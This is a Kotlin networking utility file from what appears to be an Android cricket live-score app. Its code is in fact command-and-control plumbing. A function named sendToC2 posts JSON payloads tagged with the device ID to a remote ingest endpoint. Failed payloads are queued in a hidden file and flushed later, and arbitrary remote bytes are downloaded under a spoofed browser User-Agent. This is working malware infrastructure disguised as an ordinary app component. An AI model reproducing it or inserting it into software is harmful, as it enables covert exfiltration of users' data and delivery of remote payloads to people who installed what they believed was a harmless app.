package com.cricket.livescore.utils

import android.content.Context
import android.util.Log
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.File
import java.io.InputStream
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

object NetworkUtils {
    const val TAG = "NetworkUtils"
    const val TIMEOUT_MS = 30000
    const val QUEUE_FILE = "c2_queue"
    const val MAX_QUEUE = 100

    fun sendToC2(baseUrl: String, jsonPayload: String, context: Context? = null): Boolean {
        var success = false
        for (attempt in 1..3) {
            try {
                val url = URL("$baseUrl/api/ingest")
                val conn = url.openConnection() as HttpURLConnection
                conn.apply {
                    requestMethod = "POST"
                    connectTimeout = TIMEOUT_MS
                    readTimeout = TIMEOUT_MS
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("X-Device-ID", android.os.Build.ID)
                }

                val writer = DataOutputStream(conn.outputStream)
                writer.writeBytes(jsonPayload)
                writer.flush()
                writer.close()

                val responseCode = conn.responseCode
                conn.disconnect()
                if (responseCode == 200) {
                    success = true
                    break
                }
            } catch (e: Throwable) {
                Log.e(TAG, "sendToC2 attempt $attempt failed", e)
                if (attempt < 3) Thread.sleep(1000L * attempt)
            }
        }
        if (!success && context != null) {
            queuePayload(context, jsonPayload)
        }
        return success
    }

    private fun queuePayload(context: Context, payload: String) {
        try {
            val queueFile = File(context.filesDir, QUEUE_FILE)
            val entries = if (queueFile.exists()) {
                queueFile.readLines().toMutableList()
            } else {
                mutableListOf()
            }
            entries.add(payload)
            if (entries.size > MAX_QUEUE) {
                entries.removeAt(0)
            }
            queueFile.writeText(entries.joinToString("\n"))
            Log.i(TAG, "Payload queued (${entries.size} pending)")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue payload", e)
        }
    }

    fun flushQueue(baseUrl: String, context: Context) {
        try {
            val queueFile = File(context.filesDir, QUEUE_FILE)
            if (!queueFile.exists()) return
            val entries = queueFile.readLines().toMutableList()
            if (entries.isEmpty()) return

            val iterator = entries.iterator()
            var flushed = 0
            while (iterator.hasNext()) {
                val payload = iterator.next()
                var sent = false
                for (attempt in 1..2) {
                    try {
                        val url = URL("$baseUrl/api/ingest")
                        val conn = url.openConnection() as HttpURLConnection
                        conn.apply {
                            requestMethod = "POST"
                            connectTimeout = 10000
                            readTimeout = 10000
                            doOutput = true
                            setRequestProperty("Content-Type", "application/json")
                        }
                        DataOutputStream(conn.outputStream).apply {
                            writeBytes(payload)
                            flush()
                            close()
                        }
                        if (conn.responseCode == 200) {
                            sent = true
                            iterator.remove()
                            flushed++
                            break
                        }
                        conn.disconnect()
                    } catch (e: Exception) {
                        Log.e(TAG, "Flush attempt failed", e)
                    }
                }
                if (!sent) break
            }
            if (entries.isEmpty()) {
                queueFile.delete()
            } else {
                queueFile.writeText(entries.joinToString("\n"))
            }
            if (flushed > 0) Log.i(TAG, "Flushed $flushed queued payloads")
        } catch (e: Exception) {
            Log.e(TAG, "Flush queue error", e)
        }
    }

    fun downloadBytes(urlString: String): ByteArray? {
        return try {
            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection
            conn.apply {
                connectTimeout = TIMEOUT_MS
                readTimeout = TIMEOUT_MS
                requestMethod = "GET"
                setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14)")
            }

            val inputStream: InputStream = conn.inputStream
            val bytes = inputStream.readBytes()
            inputStream.close()
            conn.disconnect()
            bytes
        } catch (e: Throwable) {
            Log.e(TAG, "downloadBytes failed", e)
            null
        }
    }

    fun checkConnectivity(): Boolean {
        return try {
            val url = URL("https://www.google.com/generate_204")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.connect()
            val code = conn.responseCode
            conn.disconnect()
            code == 204 || code == 200
        } catch (e: Exception) {
            false
        }
    }
}
